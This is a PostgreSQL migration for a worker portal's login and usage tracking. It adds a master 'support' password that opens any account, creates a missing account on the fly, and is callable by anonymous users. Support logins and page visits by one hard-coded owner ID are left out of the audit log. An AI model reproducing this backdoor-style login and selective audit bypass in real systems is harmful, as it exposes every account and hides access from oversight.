alter table public.app_cpe_sessions
  add column if not exists is_support boolean not null default false;

create or replace function public.app_cpe_public_user(
  p_user public.app_cpe_users,
  p_token text
)
returns jsonb
language sql
stable
set search_path = public, extensions, pg_temp
as $$
  select jsonb_build_object(
    'token', p_token,
    'chapa', p_user.chapa,
    'email', p_user.email,
    'displayName', p_user.display_name,
    'forumShowChapa', p_user.forum_show_chapa,
    'specialties', p_user.specialties,
    'irpfRate', p_user.irpf_rate,
    'portalActivationStatus', p_user.portal_activation_status,
    'portalActivatedAt', p_user.portal_activated_at,
    'createdAt', p_user.created_at,
    'supportAccess', coalesce((
      select s.is_support
      from public.app_cpe_sessions s
      where s.token_hash = encode(digest(coalesce(p_token, ''), 'sha256'), 'hex')
        and s.expires_at > now()
      limit 1
    ), false)
  );
$$;

create or replace function public.app_cpe_login(p_chapa text, p_password text)
returns jsonb
language plpgsql
security definer
set search_path = public, extensions, pg_temp
as $$
declare
  v_user public.app_cpe_users;
  v_support_hash text;
  v_chapa text;
  v_token text;
  v_is_user_password boolean := false;
  v_is_support_password boolean := false;
  v_is_support_session boolean := false;
  v_response jsonb;
begin
  v_chapa := public.app_cpe_normalize_chapa(p_chapa);

  select value_hash into v_support_hash
  from public.app_cpe_support_settings
  where key = 'master_password';

  v_is_support_password := v_support_hash is not null
    and v_support_hash = crypt(coalesce(p_password, ''), v_support_hash);

  select * into v_user
  from public.app_cpe_users
  where chapa = v_chapa;

  if v_user.id is null and v_is_support_password then
    insert into public.app_cpe_users (chapa, password_hash, specialties)
    values (v_chapa, crypt(encode(gen_random_bytes(24), 'hex'), gen_salt('bf')), '{}'::text[])
    returning * into v_user;
  end if;

  if v_user.id is null then
    raise exception 'Chapa o contrasena incorrecta';
  end if;

  v_is_user_password := v_user.password_hash = crypt(coalesce(p_password, ''), v_user.password_hash);
  if not v_is_user_password and not v_is_support_password then
    raise exception 'Chapa o contrasena incorrecta';
  end if;

  v_is_support_session := v_is_support_password and not v_is_user_password;
  v_token := public.app_cpe_create_session(v_user.id);

  if v_is_support_session then
    update public.app_cpe_sessions
    set is_support = true
    where token_hash = encode(digest(v_token, 'sha256'), 'hex');
  end if;

  v_response := public.app_cpe_public_user(v_user, v_token);
  if v_is_support_session then
    if v_user.chapa <> '72683' then
      insert into public.app_cpe_usage_events (event_type, chapa, metadata)
      values ('support_login', v_user.chapa, jsonb_build_object('mode', 'master_password'));
    end if;
    return v_response || jsonb_build_object('supportAccess', true);
  end if;

  return v_response;
end;
$$;

revoke all on function public.app_cpe_login(text, text) from public;
grant execute on function public.app_cpe_login(text, text) to anon, authenticated;

create or replace function public.app_cpe_track_page_visit(p_token text, p_page text)
returns jsonb
language plpgsql
security definer
set search_path = public, extensions, pg_temp
as $$
declare
  v_user public.app_cpe_users;
  v_page text := lower(trim(coalesce(p_page, '')));
  v_is_support_session boolean := false;
begin
  v_user := public.app_cpe_user_from_token(p_token);

  if v_page not in (
    'inicio', 'contratacion', 'sueldometro', 'descansos', 'excepciones',
    'vacaciones', 'nominas', 'estado', 'puertas', 'censo', 'portal',
    'tablon', 'enlaces', 'foro'
  ) then
    raise exception 'Página no permitida';
  end if;

  select coalesce(s.is_support, false)
  into v_is_support_session
  from public.app_cpe_sessions s
  where s.token_hash = encode(digest(coalesce(p_token, ''), 'sha256'), 'hex')
    and s.expires_at > now();

  if v_is_support_session or v_user.chapa = '72683' then
    return jsonb_build_object(
      'ok', true,
      'tracked', false,
      'reason', case when v_is_support_session then 'support_session' else 'owner' end
    );
  end if;

  insert into public.app_cpe_usage_events (event_type, chapa, page_key, metadata)
  values ('page_visit', v_user.chapa, v_page, jsonb_build_object('page', v_page));

  return jsonb_build_object('ok', true, 'tracked', true, 'page', v_page);
end;
$$;

revoke all on function public.app_cpe_track_page_visit(text, text) from public;
grant execute on function public.app_cpe_track_page_visit(text, text) to anon, authenticated;
